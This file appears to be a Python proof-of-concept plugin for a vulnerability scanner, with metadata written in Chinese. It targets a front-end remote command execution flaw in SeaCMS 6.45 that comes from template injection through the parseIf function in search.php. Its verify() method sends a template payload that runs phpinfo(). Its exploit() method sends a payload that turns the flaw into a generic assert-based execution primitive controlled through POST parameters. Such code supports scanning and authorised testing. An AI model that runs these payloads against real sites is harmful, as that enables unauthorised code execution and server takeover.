# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'SEACMS_0001_p'  # 平台漏洞编号，留空
    name = '海洋CMS 6.45 前台命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-02-25'  # 漏洞公布时间
    desc = '''
        SeaCMS是一套使用PHP编写的免费、开源的网站内容管理系统。该系统主要被设计用来管理视频点播资源。
        漏洞的初始接口在./search.php文件中。
        $content=replaceCurrentTypeId($content,-444);
        $content=$mainClassObj->parseIf($content);
        $content=str_replace("{seacms:member}",front_member(),$content);
        原因是类的parseIf函数中存在漏洞。
    '''  # 漏洞描述
    ref = 'https://blog.csdn.net/qq_35078631/article/details/76595817'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SEACMS(海洋CMS)'  # 漏洞应用名称
    product_version = '<6.45'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0590fa75-62dd-44df-9a37-6cf6038d017b'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 根据安装目录不同payload可能不同，需根据实际情况判断
            payload = '/seacms_upload/search.php?searchtype=5'
            data = 'searchword=d&order=}{end if}{if:1)phpinfo();if(1}{end if}'
            url = self.target + payload
            r = requests.post(url, data=data)
            if 'PHP Version' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 根据安装目录不同payload可能不同，需根据实际情况判断
            payload = '/seacms_upload/search.php?searchtype=5'
            data = 'searchword=d&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=phpinfo();'
            url = self.target + payload
            r = requests.post(url, data=data)
            if 'PHP Version' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
